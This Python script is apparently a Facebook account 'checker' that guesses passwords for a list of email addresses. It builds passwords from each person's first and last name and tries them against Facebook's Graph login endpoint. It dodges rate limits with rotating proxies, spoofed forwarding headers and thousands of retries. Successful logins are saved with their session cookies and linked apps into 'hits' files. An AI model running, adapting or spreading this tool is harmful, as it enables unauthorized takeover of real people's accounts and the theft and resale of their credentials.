import sys
import random
import uuid
import time
import re
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, init
import user_agent
from faker import Faker
import json
import socket
import os
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
""" @anasxzer00 """
init(autoreset=True)
fake = Faker()
anasRetries = 8000
anasTimeout = 15
anasxzer00 = 150
byAnasxzer00 = 20
anasLogin = "https://graph.facebook.com/auth/login"
anasCapture = "https://www.facebook.com/settings/"
anasHits = "Facebook-Hits.txt"
anasFree = "Facebook-Free.txt"
anasLocked = "Facebook-Locked.txt"
""" @XhennXoyyV1 """

class FacebookChecker:
    def __init__(self):
        self.lock = Lock()
        self.stats = {
            'hit': 0,
            'free': 0,
            'bad': 0,
            'retries': 0,
            'two_fa': 0,
            'locked': 0
        }
        self.proxies = []
        self.use_proxy = False
        self.combos = []
        self.max_workers = byAnasxzer00

    def anasConfig(self):
        print("—" * 60)
        self.use_proxy = input(" [+] Use Proxy?: (y/n) ").strip().lower() == 'y'
        if self.use_proxy:
            self.max_workers = anasxzer00
            proxy_file = input(" -[$] Proxy File: ").strip()
            print("—" * 60)
            try:
                with open(proxy_file, "r", encoding="utf-8", errors="ignore") as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                if not self.proxies:
                    print("Fuck you, proxy not found lets start with no proxy.")
                    self.use_proxy = False
                    self.max_workers = byAnasxzer00
            except FileNotFoundError:
                print("Fuck you, proxy not found lets start with no proxy.")
                self.use_proxy = False
                self.max_workers = byAnasxzer00
        
        print("—" * 60)
        anasComboID = input(" -- @XhennXoyyV1 | Facebook Crack (ID File)\n\n -[$] ID File: ")
        try:
            with open(anasComboID, "r", encoding="utf-8", errors="ignore") as f:
                self.combos = [line.strip() for line in f if line.strip()]
            if not self.combos:
                print("Combo file is empty.")
                sys.exit()
        except FileNotFoundError:
            print("Combo file not found.")
            sys.exit()

    def anasStats(self, stat_key, count=1):
        with self.lock:
            if stat_key in self.stats:
                self.stats[stat_key] += count
            sys.stdout.write(
                f"\r{Fore.GREEN} Hits{Fore.WHITE}: {self.stats['hit']} // "
                f"{Fore.RED}Bad{Fore.WHITE}: {self.stats['bad']} // "
                f"{Fore.YELLOW}Retries{Fore.WHITE}: {self.stats['retries']} // "
                f"{Fore.MAGENTA}2FA{Fore.WHITE}: {self.stats['two_fa']} // "
                f"{Fore.CYAN}Free{Fore.WHITE}: {self.stats['free']} "
            )
            sys.stdout.flush()

    def anasRandomIP(self):
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def anasParse(self, proxy_raw):
        if not proxy_raw:
            return None
        p = proxy_raw.strip()
        if not p.startswith(("http://", "https://", "socks4://", "socks5://")):
            p = "http://" + p
        return {
            "http": p,
            "https": p
        }

    def anasRandomProxy(self):
        if not self.use_proxy or not self.proxies:
            return None
        return self.anasParse(random.choice(self.proxies))

    def anasSession(self):
        session = requests.Session()
        retry_strategy = Retry(
            total=anasRetries,
            backoff_factor=1,
            status_forcelist=[408, 429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        session.headers.update({
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        })
        return session

    def anasLoginHeaders(self, random_ip):
        return {
            "Host": "graph.facebook.com",
            "User-Agent": user_agent.generate_user_agent(),
            "Content-Type": "application/json;charset=utf-8",
            "Accept-Encoding": "gzip",
            "Forwarded": f"for={random_ip}; by={random_ip}",
            "X-Forwarded-For": random_ip,
            "X-Real-IP": random_ip,
            "Client-IP": random_ip,
            "x-forwarded-for": random_ip,
            "x-real-ip": random_ip,
            "x-client-ip": random_ip
        }

    def anasGetData(self, email, password):
        return {
            "locale": "en_US",
            "format": "json",
            "email": email,
            "password": password,
            "access_token": "1792792947455470|f43b4b4c85276992ac952012f8bba674",
            "generate_session_cookies": 1,
            "adid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "family_device_id": fake.uuid4(),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "client_country_code": "US",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"
        }

    def anasCaptureHeaders(self, random_ip):
        return {
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'referer': 'https://www.facebook.com/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Linux"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent.generate_user_agent(),
            'viewport-width': '980',
            "Forwarded": f"for={random_ip}; by={random_ip}",
            "X-Forwarded-For": random_ip,
            "X-Real-IP": random_ip,
            "Client-IP": random_ip,
        }

    def get_linked_apps(self, cookies, proxy):
        params = {'tab': 'applications'}
        try:
            response = requests.get(
                anasCapture,
                params=params,
                cookies=cookies,
                headers=self.anasCaptureHeaders(self.anasRandomIP()),
                proxies=proxy,
                timeout=anasTimeout
            )
            linked_apps = re.findall(r'"app_name":"(.*?)"', response.text)
            return list(set(linked_apps))
        except Exception:
            return []

    def anasSaveHits(self, filename, content):
        with self.lock:
            with open(filename, "a", encoding="utf-8") as f:
                f.write(content + "\n")

    def anasPasswords(self, first_name, last_name):
        passwords = []
        fn = first_name.strip()
        ln = last_name.strip()
        passwords.append(fn.lower() + "1234")
        passwords.append(fn.capitalize() + "1234")
        passwords.append(fn.lower() + "@1234")
        passwords.append(fn.lower() + "1234@")
        passwords.append(fn.capitalize() + "1234@")
        passwords.append(fn.capitalize() + "@1234")
        passwords.append(fn.capitalize() + "112233")
        passwords.append(fn.lower() + "112233")
        passwords.append(f"{fn.capitalize()} {ln.capitalize()}")
        passwords.append(f"{fn.lower()} {ln.lower()}")
        passwords.append(fn.lower() + fn.lower())
        passwords.append(fn.lower() + "123")
        return list(set(passwords))

    def anasProcessAcc(self, combo):
        if "|" not in combo:
            return
        email, name = combo.split("|", 1)
        try:
            first_name, last_name = name.strip().split(" ", 1)
        except ValueError:
            first_name, last_name = name.strip(), ""
        
        passwords = self.anasPasswords(first_name, last_name)
        for password in passwords:
            success = self.anasAttemptLogin(email, password)
            if success is not None:
                return
        self.anasStats("bad")

    def anasAttemptLogin(self, email, password):
        for _ in range(anasRetries + 1):
            session = self.anasSession()
            proxy = self.anasRandomProxy()
            ip = self.anasRandomIP()
            headers = self.anasLoginHeaders(ip)
            data = self.anasGetData(email, password)
            
            try:
                response = session.post(
                    anasLogin,
                    headers=headers,
                    json=data,
                    proxies=proxy,
                    timeout=anasTimeout
                )
                response_json = response.json()
                
                if "session_key" in response_json:
                    cookies = {
                        "c_user": response_json["session_cookies"][0]["value"],
                        "xs": response_json["session_cookies"][1]["value"]
                    }
                    linked_apps = self.get_linked_apps(cookies, proxy)
                    result_text = f"{email}|{password} | Apps: {linked_apps}"
                    self.anasSaveHits(anasHits, f"{email}|{password} | {linked_apps}")
                    self.anasStats("hit")
                    return True
                elif "checkpoint" in response.text:
                    result_text = f"{email}|{password}"
                    self.anasSaveHits(anasLocked, f"{email}|{password}")
                    self.anasStats("locked")
                    return True
                elif "login appr" in response.text:
                    result_text = f"{email}|{password}"
                    self.anasStats("two_fa")
                    return True
                elif "The password that you've entered is incorrect" in response.text or "Invalid" in response.text or "incorrect" in response.text:
                    return None
                elif "must verify" in response.text or "must confirm" in response.text:
                    result_text = f"{email}|{password}"
                    self.anasSaveHits(anasFree, f"{email}|{password}")
                    self.anasStats("free")
                    return True
            except Exception as e:
                self.anasStats("retries")
                continue
        
        return None

    def run(self):
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.anasProcessAcc, combo) for combo in self.combos]
            for _ in as_completed(futures):
                pass

if __name__ == "__main__":
    checker = FacebookChecker()
    checker.anasConfig()
    checker.run()